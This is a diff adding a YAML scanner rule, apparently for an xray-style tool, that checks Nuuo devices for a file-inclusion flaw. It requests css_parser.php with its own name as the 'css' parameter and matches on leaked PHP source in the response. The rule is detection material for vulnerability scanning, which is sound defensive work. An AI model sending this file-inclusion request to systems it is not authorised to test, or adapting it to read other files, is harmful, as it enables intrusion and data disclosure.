@@ -1,0 +1,14 @@
+id: nuuo-file-inclusion
+
+info:
+    name: Nuuo file inclusion
+    author: 2357000166(https://github.com/2357000166)
+    severity: high
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /css_parser.php?css=css_parser.php
+        expression: response.status == 200 && response.headers["content-type"] == "text/css" && response.body.bcontains(b"$_GET['css']")
+expression: r0()
